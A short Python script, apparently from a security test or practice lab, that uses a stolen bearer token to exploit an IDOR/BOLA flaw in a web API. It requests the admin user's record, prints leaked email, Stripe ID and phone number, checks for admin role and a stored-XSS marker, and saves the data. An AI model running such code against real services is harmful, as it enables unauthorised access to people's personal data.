import requests
import json

# --- UPDATE THIS TOKEN FROM BURP ---
NEW_BEARER_TOKEN = "PASTE_NEW_TOKEN_HERE"

API_HOST = "https://api.anytask.thesecurityteam.rocks"
HEADERS = {
    "Authorization": f"Bearer {NEW_BEARER_TOKEN}",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Origin": "https://anytask.thesecurityteam.rocks"
}

def verify_findings(target_id):
    print(f"--- VERIFYING FINDINGS FOR ID: {target_id} ---\n")
    
    # We use the endpoint format that worked in your Burp history
    url = f"{API_HOST}/v1/user" 
    
    try:
        # 1. VERIFY BOLA (READ) & PII LEAK
        # We add the ?id=1 to the request to see if it lets us see the Admin
        r = requests.get(f"{url}?id={target_id}", headers=HEADERS)
        
        if r.status_code == 200:
            data = r.json()
            print(f"[SUCCESS] VULN 1: BOLA (IDOR) Verified.")
            
            # Check for PII Leak
            email = data.get('email')
            stripe = data.get('stripe_id')
            mobile = data.get('mobile')
            print(f"[SUCCESS] VULN 2: PII Data Leak Verified.")
            print(f"    > Found Email: {email}")
            print(f"    > Found Stripe ID: {stripe}")
            print(f"    > Found Mobile: {mobile}")

            # 3. VERIFY PRIVILEGE ESCALATION (ROLES)
            roles = data.get('roles', [])
            if "ROLE_ADMIN" in roles:
                print(f"[SUCCESS] VULN 3: Privilege Escalation Verified (Target is ADMIN).")
            
            # 4. VERIFY STORED XSS
            # We check if your "name" payload is reflected back exactly
            name_field = data.get('profile', {}).get('username', '') # or data.get('name')
            if "\">" in str(data):
                print(f"[SUCCESS] VULN 4: Stored XSS Verified (Payload reflected in API).")

            # SAVE EVIDENCE
            filename = f"evidence_id_{target_id}.json"
            with open(filename, "w") as f:
                json.dump(data, f, indent=4)
            print(f"\n[*] ALL EVIDENCE SAVED TO: {filename}")

        elif r.status_code == 401:
            print("[!] ERROR: Token Expired again. Refresh the page and grab the token quickly!")
        else:
            print(f"[-] Status {r.status_code}: The server blocked the request or the ID format is wrong.")

    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    # Testing against Admin ID 1
    verify_findings(1)